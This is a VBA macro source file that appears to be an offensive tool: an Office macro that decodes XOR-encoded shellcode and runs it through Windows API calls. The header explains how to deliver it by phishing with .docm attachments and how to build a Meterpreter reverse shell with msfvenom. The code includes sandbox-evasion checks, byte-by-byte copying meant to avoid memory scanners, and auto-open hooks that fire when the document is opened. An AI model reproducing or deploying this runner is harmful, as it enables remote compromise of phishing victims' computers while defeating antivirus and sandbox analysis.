' ============================================================
' Office VBA Macro — XOR Shellcode Runner
' ============================================================
' WHAT THIS DOES:
'   Executes shellcode directly from a Word/Excel macro using
'   Windows API calls. The shellcode is XOR-encoded (key=250/0xfa)
'   to avoid static signature detection.
'
' WHEN TO USE:
'   - Phishing via email with .docm attachment
'   - When you need code execution on macro enable
'
' HOW TO EMBED:
'   1. Generate shellcode:
'      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f csharp
'
'   2. XOR encode with key 0xfa:
'      python3 04-encoders/xor/xor_encoder.py shell.bin 0xfa
'      (Outputs as VBA array format)
'
'   3. Paste encoded bytes into buf = Array(...) below
'      If >25 lines, split into asd and das arrays (see merge code below)
'
'   4. Open Word → Alt+F8 → Create macro "MyMacro"
'   5. Paste this code
'   6. Save as .docm (Macro-Enabled Document)
'
' COMPILE (none needed — VBA is interpreted)
'
' NOTES:
'   - FlsAlloc check: sandbox evasion (sandboxes don't support FLS)
'   - VirtualAlloc: allocates RWX memory in the current process
'   - RtlMoveMemory: copies shellcode to allocated memory byte by byte
'   - CreateThread: creates a new thread at the shellcode address
' ============================================================

' -------------------------------------------------------
' API Declarations — Win32 functions we need from kernel32.dll
' -------------------------------------------------------

' Sleep: Pause execution. Used for sandbox evasion (sandboxes fast-forward sleep)
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

' CreateThread: Creates a new thread in the current process at a specified address
'   lpThreadAttributes = 0 (default security)
'   dwStackSize        = 0 (default stack size)
'   lpStartAddress     = address of shellcode to execute
'   lpParameter        = 0 (no parameter)
'   dwCreationFlags    = 0 (run immediately)
'   lpThreadId         = receives the thread ID
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" ( _
    ByVal lpThreadAttributes As Long, _
    ByVal dwStackSize As Long, _
    ByVal lpStartAddress As LongPtr, _
    lpParameter As Long, _
    ByVal dwCreationFlags As Long, _
    lpThreadId As Long) As LongPtr

' VirtualAlloc: Allocates memory in the process with specified permissions
'   lpAddress      = 0 (let Windows choose the address)
'   dwSize         = size of shellcode
'   flAllocationType = 0x3000 = MEM_COMMIT | MEM_RESERVE
'   flProtect      = 0x40 = PAGE_EXECUTE_READWRITE (RWX)
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" ( _
    ByVal lpAddress As Long, _
    ByVal dwSize As Long, _
    ByVal flAllocationType As Long, _
    ByVal flProtect As Long) As LongPtr

' RtlMoveMemory: Copies bytes from source to destination
'   Used to write shellcode to allocated memory one byte at a time
'   (byte-by-byte avoids some memory scanning that looks for full shellcode blocks)
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" ( _
    ByVal destAddr As LongPtr, _
    ByRef sourceAddr As Any, _
    ByVal length As Long) As LongPtr

' FlsAlloc: Fiber Local Storage allocation. Used as a sandbox check.
'   Many sandboxes don't fully support FLS — FlsAlloc returns null in them.
'   Real Windows always returns a valid slot index.
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

' -------------------------------------------------------
' Main Macro (the payload)
' -------------------------------------------------------
Sub MyMacro()
    Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr

    ' -------------------------------------------------------
    ' SANDBOX EVASION CHECK 1: Fiber Local Storage
    ' -------------------------------------------------------
    ' FlsAlloc(0) returns a valid FLS slot index on real Windows.
    ' In sandboxes/emulators, it often returns null/0.
    ' If null, we exit without running any payload (sandbox can't analyze us).
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End  ' Exit macro immediately
    End If

    ' -------------------------------------------------------
    ' SANDBOX EVASION CHECK 2: Sleep timing (optional, add if needed)
    ' -------------------------------------------------------
    ' Uncomment to add: sleep 5 seconds, verify real time passed
    ' t1 = Now()
    ' Sleep (5000)
    ' t2 = Now()
    ' time = DateDiff("s", t1, t2)
    ' If time < 4.5 Then Exit Sub

    ' -------------------------------------------------------
    ' SHELLCODE (XOR encoded, key = 250 / 0xfa)
    ' -------------------------------------------------------
    ' PASTE YOUR SHELLCODE HERE as a VBA array.
    ' Format: Array(0x06 XOR 0xfa, 0xb2 XOR 0xfa, ...)
    '
    ' Generate with: python3 04-encoders/xor/xor_encoder.py shell.bin 0xfa --format vba
    '
    ' If shellcode is too long for one Array() call (>1000 bytes):
    '   Split it into asd and das, then merge them below.
    '   asd = Array(byte1, byte2, ...) ' First half
    '   das = Array(byte3, byte4, ...) ' Second half
    '   buf = Split(Join(asd, ",") & "," & Join(das, ","), ",")
    '
    ' PLACEHOLDER — replace with your actual encoded shellcode:
    asd = Array(buf)  ' First chunk of shellcode bytes
    das = Array(buf)  ' Second chunk (if needed)

    ' Join the two arrays back into one (handles >25 line payloads)
    buf = Split(Join(asd, ",") & "," & Join(das, ","), ",")

    ' -------------------------------------------------------
    ' ALLOCATE RWX MEMORY
    ' -------------------------------------------------------
    ' VirtualAlloc arguments:
    '   0      = let OS choose address
    '   UBound(buf) = size (number of bytes in shellcode)
    '   &H3000 = MEM_COMMIT (0x1000) | MEM_RESERVE (0x2000)
    '   &H40   = PAGE_EXECUTE_READWRITE (we can write AND execute)
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    ' -------------------------------------------------------
    ' DECODE SHELLCODE (XOR with key 250/0xfa)
    ' -------------------------------------------------------
    ' Each byte in buf[] was XOR'd with 250 when we encoded it.
    ' XOR again with the same key to recover the original shellcode.
    ' (XOR is its own inverse: A XOR K XOR K = A)
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 250
    Next i

    ' -------------------------------------------------------
    ' COPY SHELLCODE TO ALLOCATED MEMORY
    ' -------------------------------------------------------
    ' Write shellcode byte-by-byte to the RWX memory region.
    ' Byte-by-byte copy is slower but avoids detection by scanners
    ' that look for bulk memory writes containing shellcode signatures.
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' -------------------------------------------------------
    ' EXECUTE SHELLCODE
    ' -------------------------------------------------------
    ' CreateThread creates a new thread starting at 'addr' (our shellcode).
    ' The current macro thread continues and exits normally.
    ' The shellcode thread calls back to our Metasploit listener.
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

' -------------------------------------------------------
' Auto-execution hooks
' -------------------------------------------------------
' These make the macro run automatically when the document opens.
' Document_Open: fires when Word document is opened
' AutoOpen: fires as a legacy fallback for older Word versions
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
